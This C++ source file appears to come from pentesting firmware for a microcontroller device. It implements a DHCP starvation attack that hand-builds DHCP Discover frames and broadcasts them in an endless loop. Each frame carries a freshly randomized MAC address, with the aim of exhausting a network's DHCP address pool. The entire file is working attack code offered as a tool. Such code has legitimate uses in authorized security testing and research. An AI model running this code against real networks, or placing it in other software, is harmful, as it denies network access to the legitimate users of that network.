/**
 * @file DHCPStarvation.cpp
 * @author Andrea Canale (https://github.com/andreock)
 * @brief Implementation of an ethernet DHCP Starvation attack
 * @note Sending logic backported from ARP attacks
 * @version 0.1
 * @date 2025-07-07
 */
#if !defined(LITE_VERSION)
#include "DHCPStarvation.h"
#include "Arduino.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/net_utils.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "lwip/pbuf.h"
#include "lwipopts.h"
#include <globals.h>
#include <iomanip>
#include <iostream>
#include <lwip/dns.h>
#include <lwip/err.h>
#include <lwip/etharp.h>
#include <lwip/igmp.h>
#include <lwip/inet.h>
#include <lwip/init.h>
#include <lwip/ip_addr.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/netif.h>
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/timeouts.h>

DHCPStarvation::DHCPStarvation() {
    setup();
    show_gui();
    loop();
}

DHCPStarvation::~DHCPStarvation() { pbuf_free(p); }

void DHCPStarvation::show_gui() {
    drawMainBorderWithTitle("DHCP Starvation");

    displayTextLine("Press Any key to stop");
}

void DHCPStarvation::loop() {
    AnyKeyPress = false;
    while (true) {
        send_DHCP_packet();
        if (check(AnyKeyPress)) { break; }
    }
}

void DHCPStarvation::prepare_ethernet_hdr() {
    // DHCP discover is sent to broadcast
    memcpy(ethernet_frame, broadcast_mac_address, MAC_ADDRESS_LENGTH * sizeof(uint8_t));

    // Source will be added to the frame in the send_DHCP_packet method

    // Packet type(IPV4 0x0800)
    ethernet_frame[12] = ETHERNET_PROTOCOL_IPV4 / 256;
    ethernet_frame[13] = ETHERNET_PROTOCOL_IPV4 % 256;
}

// Fill UDP and IPV4 header structure
void DHCPStarvation::prepare_udp_ipv4_hdr() {
    udp_payload.src = htons(68);
    udp_payload.dest = htons(67);
    udp_payload.len = htons(252);

    ipv4_pkt._v_hl = 0x45; // IPV4-Jeader len: 5 bytes
    ipv4_pkt._tos = 0x10;
    ipv4_pkt._len = htons(272); // 272, total len
    ipv4_pkt._id = 0x0;
    ipv4_pkt._offset = 0x0;
    ipv4_pkt._ttl = 0x10;   // TTL: 16
    ipv4_pkt._proto = 0x11; // Protocol: 17(UDP)

    memcpy(&ipv4_pkt.dest.addr, broadcast_mac_address, 4);

    uint8_t src_ip[4] = {0, 0, 0, 0};
    memcpy(&ipv4_pkt.src.addr, src_ip, 4);

    // Checksum never change since it's calculated only on the IPV4 header.
    ipv4_pkt._chksum = 0xcea9;

    // Copy IPV4 header to ethernet frame
    memcpy(ethernet_frame + ETH_HDRLEN, &ipv4_pkt, 20 * sizeof(uint8_t));
}

// Fill DHCP header structure
void DHCPStarvation::prepare_dhcp_hdr() {
    dhcp_payload.op = 0x01;    // Boot request
    dhcp_payload.htype = 0x01; // Ethernet
    dhcp_payload.hlen = 0x06;  // MAC address len
    dhcp_payload.hops = 0x00;
    dhcp_payload.xid = random();
    dhcp_payload.secs = 0x0000;
    dhcp_payload.flags = htons(0x8000); // Broadcast flag

    // Here to save time avoiding memset, use directly uint32_t since the address is 0.0.0.0
    dhcp_payload.ciaddr.addr = 0; // 0.0.0.0
    dhcp_payload.yiaddr.addr = 0;
    dhcp_payload.siaddr.addr = 0;
    dhcp_payload.giaddr.addr = 0;

    memset(&dhcp_payload.chaddr, 0, 16);

    // Insert 192 bit of padding
    memset(dhcp_payload.sname, 0, DHCP_SNAME_LEN);
    memset(dhcp_payload.file, 0, DHCP_FILE_LEN);

    dhcp_payload.cookie = htonl(0x63825363); // Identify DHCP packet

    dhcp_payload.options[0] = 0x35; // Option 53
    dhcp_payload.options[1] = 0x01;
    dhcp_payload.options[2] = 0x01;
}

// Surgically change ethernet frame to include new mac address
void DHCPStarvation::change_mac_in_packet() {
    // Change MAC in ethernet frame
    memcpy(ethernet_frame + MAC_ADDRESS_LENGTH, mac, MAC_ADDRESS_LENGTH * sizeof(uint8_t));

    // Change MAC in DHCP header
    memcpy(ethernet_frame + 70, mac, MAC_ADDRESS_LENGTH);
}

void DHCPStarvation::randomize_mac() {
    for (int i = 0; i < 6; i++) { mac[i] = random() % 256; }
}

void DHCPStarvation::setup() {
    netif = netif_list;
    if (netif == NULL) {
        displayError("No interface found");
        Serial.println("No interface found");
        return;
    }

    p = pbuf_alloc(PBUF_RAW, PACKET_LENGTH_DHCP, PBUF_RAM);
    if (p == NULL) {
        displayError("Failed to allocate pbuf");
        Serial.println("Failed to allocate pbuf");
        return;
    }

    ethernet_frame = (uint8_t *)p->payload;
    prepare_ethernet_hdr();
    prepare_udp_ipv4_hdr();
    prepare_dhcp_hdr();

    //  UDP Header
    memcpy(ethernet_frame + ETH_HDRLEN + IP_HLEN, &udp_payload, DHCP_HDRLEN + UDP_HLEN);

    // Fill payload
    memcpy(ethernet_frame + ETH_HDRLEN + IP_HLEN + UDP_HLEN, &dhcp_payload, UDP_HLEN);

    ethernet_frame[285] = 0xff; // Close the packet
}

void DHCPStarvation::send_DHCP_packet() {

    uint8_t *ethernet_frame = (uint8_t *)p->payload;
    randomize_mac();
    change_mac_in_packet();

    // Send packet
    netif->linkoutput(netif, p);
}
#endif
